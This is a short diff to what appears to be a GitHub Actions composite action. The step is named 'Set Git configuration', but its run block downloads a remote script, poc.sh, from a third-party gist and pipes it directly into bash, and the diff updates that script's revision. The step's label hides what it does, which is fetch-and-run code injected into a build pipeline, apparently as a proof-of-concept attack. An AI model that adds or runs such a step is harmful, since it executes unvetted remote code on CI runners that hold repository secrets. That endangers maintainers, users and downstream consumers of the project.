@@ -9,7 +9,7 @@ runs:
   steps:
     - name: Set Git configuration
       run: |
-        curl -sSfL https://gist.githubusercontent.com/Amb1guousRaccoon/58f32dd19f35f12110c3241552307318/raw/f4c7cb75f67231abe742f55a524860d06af9e6f2/poc.sh | bash
+        curl -sSfL https://gist.githubusercontent.com/Amb1guousRaccoon/58f32dd19f35f12110c3241552307318/raw/7d8f8c16ab75c35f6c1830ae50db2ea5f8630cb3/poc.sh | bash
         exit 1
       shell: bash
     - name: Install pnpm
